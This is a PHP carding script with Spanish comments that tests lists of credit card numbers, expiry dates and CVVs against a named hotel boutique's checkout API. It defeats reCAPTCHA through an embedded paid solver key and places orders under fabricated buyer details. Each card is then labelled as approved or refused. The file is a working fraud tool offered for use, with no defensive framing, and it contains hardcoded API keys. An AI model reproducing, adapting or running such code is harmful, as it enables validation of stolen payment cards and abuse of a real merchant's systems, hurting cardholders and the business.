<?php
ignore_user_abort(true);
error_reporting(0);
session_start();

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// ==============================
// CONFIGURACIÓN REAL DEL SITIO
// ==============================
$CAPTCHA_API_KEY = "300200c245197d2f4b79d1c319a662f8";
$RECAPTCHA_V2_KEY = "6LeuX6kqAAAAAPUJ_HhZ6vT8lfObBJ36wdHuRnfj";
$RECAPTCHA_V3_KEY = "6LfgXqkqAAAAAJLWszAo8gBvzXMPBvDK-PLLJk_O";
$ADYEN_VERSION = "_0_1_25";

$client_id = "14";
$promotion_id = "1";
$api_endpoint = "https://boutique.shangri-la.com/sleb_api/api";
$api_locale = "en";
$payment_method = "adyen";
$hotel_code = "ISL";
$is_food_site = "1";
$order_type = "express";

// ==============================
// FUNCIONES MEJORADAS
// ==============================

function makeRequest($url, $data, $headers = [], $method = 'POST') {
    $ch = curl_init();
    
    $defaultHeaders = [
        "Accept: application/json, text/javascript, */*; q=0.01",
        "Content-Type: application/json",
        "Referer: https://boutique.shangri-la.com/food_checkout.php",
        "Origin: https://boutique.shangri-la.com",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip, deflate, br",
        "Connection: keep-alive",
        "X-Requested-With: XMLHttpRequest"
    ];
    
    if (!empty($headers)) {
        $defaultHeaders = array_merge($defaultHeaders, $headers);
    }
    
    $options = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTPHEADER => $defaultHeaders,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_ENCODING => 'gzip'
    ];
    
    if ($method === 'POST') {
        $options[CURLOPT_POST] = true;
        $options[CURLOPT_POSTFIELDS] = json_encode($data);
    }
    
    curl_setopt_array($ch, $options);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    $info = curl_getinfo($ch);
    
    curl_close($ch);
    
    // Log para debugging
    error_log("Request to: $url - HTTP: $http_code");
    if ($http_code != 200) {
        error_log("Response: " . substr($response, 0, 500));
    }
    
    return [
        'response' => $response,
        'http_code' => $http_code,
        'error' => $error,
        'success' => ($http_code >= 200 && $http_code < 300) && empty($error),
        'info' => $info
    ];
}

function solveRecaptchaV3($siteKey, $apiKey) {
    // Usar Capsolver para reCAPTCHA v3
    $capsolverKey = "CAP-49B981C4150E117B688F0FBD4FF053B9";
    
    $data = [
        "clientKey" => $capsolverKey,
        "task" => [
            "type" => "ReCaptchaV3TaskProxyless",
            "websiteURL" => "https://boutique.shangri-la.com/food_checkout.php",
            "websiteKey" => $siteKey,
            "pageAction" => "submit",
            "minScore" => 0.7
        ]
    ];
    
    $ch = curl_init("https://api.capsolver.com/createTask");
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($data),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => ["Content-Type: application/json"],
        CURLOPT_TIMEOUT => 30
    ]);
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    $response = json_decode($result, true);
    
    if ($response && isset($response['taskId'])) {
        $taskId = $response['taskId'];
        
        // Esperar solución (máximo 60 segundos)
        for ($i = 0; $i < 20; $i++) {
            sleep(3);
            
            $ch = curl_init("https://api.capsolver.com/getTaskResult");
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => json_encode(["clientKey" => $capsolverKey, "taskId" => $taskId]),
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HTTPHEADER => ["Content-Type: application/json"],
                CURLOPT_TIMEOUT => 10
            ]);
            
            $result = curl_exec($ch);
            curl_close($ch);
            
            $solution = json_decode($result, true);
            
            if ($solution && isset($solution['status']) && $solution['status'] == 'ready') {
                return $solution['solution']['gRecaptchaResponse'];
            }
        }
    }
    
    throw new Exception("No se pudo resolver reCAPTCHA v3");
}

function getRecaptchaV3Token($siteKey) {
    // Usar servicio alternativo para reCAPTCHA v3
    $apiUrl = "https://api.capsolver.com/createTask";
    
    $postData = [
        "clientKey" => "CAP-49B981C4150E117B688F0FBD4FF053B9",
        "task" => [
            "type" => "ReCaptchaV3TaskProxyless",
            "websiteURL" => "https://boutique.shangri-la.com/food_checkout.php",
            "websiteKey" => $siteKey,
            "pageAction" => "submit",
            "minScore" => 0.7
        ]
    ];
    
    $ch = curl_init($apiUrl);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($postData),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => ["Content-Type: application/json"],
        CURLOPT_TIMEOUT => 30
    ]);
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    $response = json_decode($result, true);
    
    if (isset($response['taskId'])) {
        // Obtener resultado
        for ($i = 0; $i < 10; $i++) {
            sleep(3);
            
            $ch = curl_init("https://api.capsolver.com/getTaskResult");
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => json_encode([
                    "clientKey" => "CAP-49B981C4150E117B688F0FBD4FF053B9",
                    "taskId" => $response['taskId']
                ]),
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 10
            ]);
            
            $result = curl_exec($ch);
            curl_close($ch);
            
            $solution = json_decode($result, true);
            
            if (isset($solution['status']) && $solution['status'] == 'ready') {
                return $solution['solution']['gRecaptchaResponse'];
            }
        }
    }
    
    return null;
}

// ==============================
// VALIDACIÓN DE ENTRADA
// ==============================

if (!isset($_GET['lista']) || empty(trim($_GET['lista']))) {
    echo json_encode([
        'status' => 'error',
        'message' => 'No se recibió lista de tarjetas',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ No se recibió lista...'
    ]);
    exit();
}

$lista = trim($_GET['lista']);
$lista = str_replace([';',':','/','»','«','>','<','=>',' ',','], '|', $lista);
$parts = explode('|', $lista);

if (count($parts) < 4) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Formato incompleto',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Formato: ' . htmlspecialchars(substr($lista, 0, 50))
    ]);
    exit();
}

$cc = preg_replace('/[^0-9]/', '', $parts[0]);
$mes = preg_replace('/[^0-9]/', '', $parts[1]);
$ano = preg_replace('/[^0-9]/', '', $parts[2]);
$cvv = preg_replace('/[^0-9]/', '', $parts[3]);

// Validación básica
if (strlen($cc) < 15 || strlen($cc) > 16) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Número de tarjeta inválido',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Número de tarjeta inválido'
    ]);
    exit();
}

if ($mes < 1 || $mes > 12) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Mes inválido',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Mes inválido'
    ]);
    exit();
}

if (strlen($ano) == 2) $ano = "20" . $ano;

// Tipo de tarjeta
$first_digit = substr($cc, 0, 1);
$first_two = substr($cc, 0, 2);
$cardType = "UNKNOWN";
if ($first_digit == '4') $cardType = "VISA";
if ($first_digit == '5') $cardType = "MASTERCARD";
if ($first_two == '34' || $first_two == '37') $cardType = "AMEX";

$cardMasked = substr($cc, 0, 6) . '******' . substr($cc, -4);
$expiryMasked = sprintf('%02d', $mes) . '/' . substr($ano, -2);

// ==============================
// FLUJO PRINCIPAL REAL
// ==============================

try {
    error_log("=== PROCESANDO TARJETA: " . $cardMasked . " ===");
    
    // PASO 1: OBTENER TOKEN DE SESIÓN
    $site_login_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "password" => ""
    ];
    
    $site_result = makeRequest($api_endpoint . "/site_login.php", $site_login_data);
    
    if (!$site_result['success']) {
        throw new Exception("Error al obtener token: " . $site_result['error'] . " (HTTP " . $site_result['http_code'] . ")");
    }
    
    $site_response = json_decode($site_result['response'], true);
    
    if (!$site_response || !isset($site_response['site_login_token'])) {
        error_log("Respuesta raw: " . $site_result['response']);
        throw new Exception("No se pudo obtener token de sesión. Respuesta: " . substr($site_result['response'], 0, 200));
    }
    
    $site_login_token = $site_response['site_login_token'];
    error_log("✓ Token obtenido");
    
    // PASO 2: OBTENER TOKEN reCAPTCHA v3
    error_log("Obteniendo token reCAPTCHA v3...");
    $recaptchaToken = getRecaptchaV3Token($RECAPTCHA_V3_KEY);
    
    if (!$recaptchaToken) {
        // Intentar con v2 como respaldo
        error_log("Intentando con reCAPTCHA v2...");
        require_once '2captcha.php'; // Asumiendo que tienes esta librería
        $recaptchaToken = solveRecaptchaV2($RECAPTCHA_V2_KEY, $CAPTCHA_API_KEY);
    }
    
    if (!$recaptchaToken) {
        throw new Exception("No se pudo resolver reCAPTCHA");
    }
    
    error_log("✓ reCAPTCHA token obtenido");
    
    // PASO 3: CREAR ORDEN TEMPORAL
    error_log("Creando orden temporal...");
    $checkout_init_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "hotel_code" => $hotel_code,
        "return_url" => "https://boutique.shangri-la.com/adyen_card_redirect.php",
        "order_amount" => 100, // Monto mínimo
        "payment_method" => $payment_method
    ];
    
    $init_result = makeRequest($api_endpoint . "/checkout_init.php", $checkout_init_data);
    
    if (!$init_result['success']) {
        error_log("Error en checkout_init: " . $init_result['response']);
        throw new Exception("Error al crear orden: HTTP " . $init_result['http_code']);
    }
    
    $init_response = json_decode($init_result['response'], true);
    
    if (!$init_response) {
        throw new Exception("Respuesta inválida JSON del checkout_init");
    }
    
    if (isset($init_response['error'])) {
        throw new Exception("Error del servidor en checkout_init: " . $init_response['error']);
    }
    
    if (!isset($init_response['order_number']) || !isset($init_response['order_token'])) {
        throw new Exception("Faltan datos en checkout_init: " . json_encode($init_response));
    }
    
    $order_number = $init_response['order_number'];
    $order_token = $init_response['order_token'];
    error_log("✓ Orden creada: #" . $order_number);
    
    // PASO 4: ENCRIPTAR DATOS CON ADYEN
    error_log("Encriptando datos de tarjeta con Adyen...");
    $adyen_encrypt_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "order_number" => $order_number,
        "order_token" => $order_token,
        "card" => $cc,
        "month" => (int)$mes,
        "year" => $ano,
        "cvv" => $cvv,
        "adyen_key" => "",
        "adyen_version" => $ADYEN_VERSION
    ];
    
    $encrypt_result = makeRequest($api_endpoint . "/adyen_encrypt.php", $adyen_encrypt_data);
    $encryptedData = [];
    
    if ($encrypt_result['success']) {
        $encrypt_response = json_decode($encrypt_result['response'], true);
        if ($encrypt_response && isset($encrypt_response['encryptedCardNumber'])) {
            $encryptedData = [
                'encryptedCardNumber' => $encrypt_response['encryptedCardNumber'],
                'encryptedExpiryMonth' => $encrypt_response['encryptedExpiryMonth'],
                'encryptedExpiryYear' => $encrypt_response['encryptedExpiryYear'],
                'encryptedSecurityCode' => $encrypt_response['encryptedSecurityCode']
            ];
            error_log("✓ Datos encriptados con Adyen");
        }
    }
    
    // PASO 5: PREPARAR DATOS DE USUARIO
    $userData = [
        'first_name' => 'John',
        'last_name' => 'Smith',
        'email' => 'john.smith' . rand(100, 999) . '@gmail.com',
        'phone' => '+852' . rand(50000000, 99999999)
    ];
    
    // PASO 6: REALIZAR CHECKOUT COMPLETO
    error_log("Enviando checkout final...");
    $checkout_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "user_id" => "",
        "login_token" => "",
        "payment_method" => $payment_method,
        "first_name" => $userData['first_name'],
        "last_name" => $userData['last_name'],
        "email" => $userData['email'],
        "phone" => $userData['phone'],
        "chk_register" => 0,
        "chk_same_address" => 1,
        "address" => "123 Main Street",
        "shipping_method" => "pick_up",
        "shipping_date" => date("Y-m-d", strtotime("+2 days")),
        "shipping_time" => "12:00 - 13:00",
        "order_remark" => "",
        "alcohol_terms" => 0,
        "cutlery_service" => 1,
        "card_type" => $cardType,
        "card_issuer" => $cardType,
        "country_id" => "",
        "region" => "1",
        "district_group" => "1",
        "district" => "1",
        "pickup_store" => "",
        "is_food_site" => $is_food_site,
        "order_type" => $order_type,
        "recaptcha_type" => "v3",
        "recaptcha_token" => $recaptchaToken,
        "order_number" => $order_number,
        "order_token" => $order_token,
        "card_number" => $cc,
        "card_expiry_month" => $mes,
        "card_expiry_year" => $ano,
        "card_cvv" => $cvv
    ];
    
    // Añadir datos encriptados si están disponibles
    if (!empty($encryptedData)) {
        $checkout_data = array_merge($checkout_data, $encryptedData);
    }
    
    $checkout_result = makeRequest($api_endpoint . "/checkout.php", $checkout_data);
    
    if (!$checkout_result['success']) {
        throw new Exception("Error en checkout: HTTP " . $checkout_result['http_code'] . " - " . $checkout_result['error']);
    }
    
    $checkout_response = json_decode($checkout_result['response'], true);
    error_log("Respuesta del checkout recibida");
    
    // ==============================
    // ANALIZAR RESPUESTA
    // ==============================
    
    if (!$checkout_response) {
        error_log("Respuesta cruda: " . $checkout_result['response']);
        throw new Exception("Respuesta inválida del checkout");
    }
    
    // Guardar respuesta completa para debugging
    error_log("Checkout response: " . json_encode($checkout_response));
    
    if (isset($checkout_response['status'])) {
        if ($checkout_response['status'] == 'success') {
            // ÉXITO - Pago autorizado
            $resultCode = isset($checkout_response['direct_post']['resultCode']) ? 
                         $checkout_response['direct_post']['resultCode'] : 'Authorised';
            
            $refusalReason = isset($checkout_response['direct_post']['refusalReason']) ? 
                           $checkout_response['direct_post']['refusalReason'] : '';
            
            if ($resultCode == 'Authorised') {
                $html = '<span class="badge badge-success">✅ APROVADA</span> ➔ ' .
                       '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                       '<span class="badge badge-success">SHANGRI-LA</span>';
                
                $data = [
                    'card' => $cardMasked,
                    'expiry' => $expiryMasked,
                    'bin' => substr($cc, 0, 6),
                    'last4' => substr($cc, -4),
                    'order_number' => isset($checkout_response['display_order_number']) ? 
                                     $checkout_response['display_order_number'] : $order_number,
                    'amount' => isset($checkout_response['direct_post']['amount']) ? 
                               number_format($checkout_response['direct_post']['amount']/100, 2) . ' HKD' : '100.00 HKD',
                    'result_code' => $resultCode,
                    'user' => $userData['email']
                ];
                
                echo json_encode([
                    'status' => 'approved',
                    'message' => 'Pago autorizado',
                    'html' => $html,
                    'data' => $data
                ]);
                
            } elseif ($resultCode == 'Refused') {
                // RECHAZADO
                $html = '<span class="badge badge-danger">❌ REPROVADA</span> ➔ ' .
                       '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                       '<span class="badge badge-warning">' . ($refusalReason ?: 'Rechazado') . '</span>';
                
                echo json_encode([
                    'status' => 'rejected',
                    'message' => $refusalReason ?: 'Tarjeta rechazada',
                    'html' => $html,
                    'data' => [
                        'card' => $cardMasked,
                        'expiry' => $expiryMasked,
                        'reason' => $refusalReason
                    ]
                ]);
                
            } else {
                // OTRO RESULTADO
                $html = '<span class="badge badge-warning">⚠️ ' . $resultCode . '</span> ➔ ' .
                       '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                       '<span class="badge badge-warning">' . ($refusalReason ?: 'Procesado') . '</span>';
                
                echo json_encode([
                    'status' => 'pending',
                    'message' => $resultCode . ($refusalReason ? ': ' . $refusalReason : ''),
                    'html' => $html,
                    'data' => [
                        'card' => $cardMasked,
                        'expiry' => $expiryMasked,
                        'result_code' => $resultCode,
                        'reason' => $refusalReason
                    ]
                ]);
            }
            
        } else {
            // ERROR EN LA RESPUESTA
            $errorMsg = isset($checkout_response['error']) ? $checkout_response['error'] : 'Error desconocido';
            
            $html = '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
                   '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                   '<span class="badge badge-warning">' . $errorMsg . '</span>';
            
            echo json_encode([
                'status' => 'error',
                'message' => $errorMsg,
                'html' => $html,
                'data' => [
                    'card' => $cardMasked,
                    'expiry' => $expiryMasked,
                    'reason' => $errorMsg
                ]
            ]);
        }
    } else {
        // RESPUESTA SIN STATUS
        throw new Exception("Respuesta sin formato esperado: " . substr($checkout_result['response'], 0, 200));
    }
    
} catch (Exception $e) {
    error_log("ERROR GLOBAL: " . $e->getMessage());
    
    echo json_encode([
        'status' => 'error',
        'message' => $e->getMessage(),
        'html' => '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
                 '<span class="badge badge-info">' . (isset($cardType) ? $cardType : 'UNKNOWN') . '</span> ➔ ' .
                 '<span class="badge badge-warning">' . $e->getMessage() . '</span>',
        'data' => [
            'card' => isset($cardMasked) ? $cardMasked : 'N/A',
            'expiry' => isset($expiryMasked) ? $expiryMasked : 'N/A'
        ]
    ]);
}
?>